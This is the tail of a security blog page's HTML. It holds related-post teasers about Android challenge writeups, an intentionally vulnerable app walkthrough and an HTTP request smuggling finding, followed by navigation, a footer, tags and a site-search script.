class="unloaded">2022-03-07T16:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackerone Android Challenges Writeups</h3><div class="text-muted small"><p> Peace be upon all of you, on this writeup I am going to cover the solutions of all android challenges on Hackerone (Thermostat - Intentional Exercise - Oauthbreaker - Webdev). Difficulty: Easy and...</p></div></div></a></div><div class="card"> <a href="/posts/Insecureshop-Android-Vulnerable-Application-Writeup/"><div class="card-body"> <span class="timeago small" > Sep 6, 2024 <i class="unloaded">2024-09-06T17:40:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Walkthrough of The InsecureShop Android Vulnerable Application</h3><div class="text-muted small"><p> Introduction InsecureShop is an Android application that is designed to be intentionally vulnerable. The application serves as a platform to test your Android pentesting skills. The vulnerabilitie...</p></div></div></a></div><div class="card"> <a href="/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/"><div class="card-body"> <span class="timeago small" > Aug 29, 2021 <i class="unloaded">2021-08-29T19:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>I owe your Request | HTTP Request Smuggling leads to Full Accounts takeover</h3><div class="text-muted small"><p> Introduction Peace be upon you all, this is actually my first writeup which is going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program, which ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>Walkthrough of The InsecureShop Android Vulnerable Application</p></a> <a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/" class="btn btn-outline-primary" prompt="Newer"><p>MobileHackingLab IOS Challenges Writeups</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
